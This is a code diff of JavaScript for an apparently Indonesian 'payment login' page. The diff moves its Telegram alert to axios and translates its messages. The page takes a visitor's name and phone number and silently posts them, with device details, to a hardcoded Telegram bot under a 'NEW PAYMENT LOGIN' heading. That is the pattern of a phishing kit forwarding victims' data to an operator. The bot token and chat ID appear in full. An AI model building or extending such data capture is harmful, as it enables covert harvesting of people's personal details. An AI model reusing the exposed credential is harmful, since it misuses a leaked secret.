@@ -1,3 +1,6 @@
+// Add this to your HTML head before the script.js loads
+// <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
 document.addEventListener('DOMContentLoaded', function() {
     const loginContainer = document.getElementById('loginContainer');
     const paymentContainer = document.getElementById('paymentContainer');
@@ -9,10 +12,10 @@ document.addEventListener('DOMContentLoaded', function() {
     const paymentMethods = document.querySelectorAll('.payment-method');
     const paymentDetails = document.querySelectorAll('.payment-details');
 
-    // Function to send Telegram notification with better error handling
+    // Telegram notification function using Axios
     const sendTelegramNotification = async (name, phone) => {
-        const botToken = '7622409431:AAFOCDS9KWgCjui28zAvBuPxrqUXoD_CDzk'; // Replace with your actual bot token
-        const chatId = '7411016617'; // Replace with your actual chat ID
+        const botToken = '7622409431:AAFOCDS9KWgCjui28zAvBuPxrqUXoD_CDzk'; // Ganti dengan token bot Anda
+        const chatId = '7411016617'; // Ganti dengan chat ID Anda
         
         const message = `🔔 *NEW PAYMENT LOGIN* 🔔\n\n` +
                        `👤 *Name*: ${name}\n` +
@@ -22,27 +25,15 @@ document.addEventListener('DOMContentLoaded', function() {
                        `💻 *Device*: ${navigator.userAgent}`;
 
         try {
-            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
+            await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
             });
-
-            if (!response.ok) {
-                throw new Error(`Telegram API error: ${response.status}`);
-            }
-
-            const data = await response.json();
-            console.log('Telegram notification sent successfully:', data);
+            console.log('Notification sent to Telegram successfully');
         } catch (error) {
-            console.error('Error sending Telegram notification:', error);
-            // You can add additional error handling here if needed
+            console.error('Error sending to Telegram:', error);
+            // You can add additional error handling here
         }
     };
 
@@ -52,12 +43,12 @@ document.addEventListener('DOMContentLoaded', function() {
         const phone = phoneInput.value.trim();
         
         if (name === '') {
-            alert('Please enter your name');
+            alert('Silakan masukkan nama Anda');
             return;
         }
         
         if (phone === '') {
-            alert('Please enter your phone number');
+            alert('Silakan masukkan nomor telepon Anda');
             return;
         }
         
@@ -65,13 +56,8 @@ document.addEventListener('DOMContentLoaded', function() {
         loginContainer.style.display = 'none';
         paymentContainer.style.display = 'block';
         
-        // Send Telegram notification with error handling
-        try {
-            await sendTelegramNotification(name, phone);
-        } catch (error) {
-            console.error('Error during login:', error);
-            // Notification still works even if Telegram fails
-        }
+        // Send Telegram notification
+        await sendTelegramNotification(name, phone);
         
         // Animation
         paymentContainer.style.animation = 'fadeIn 0.5s ease';
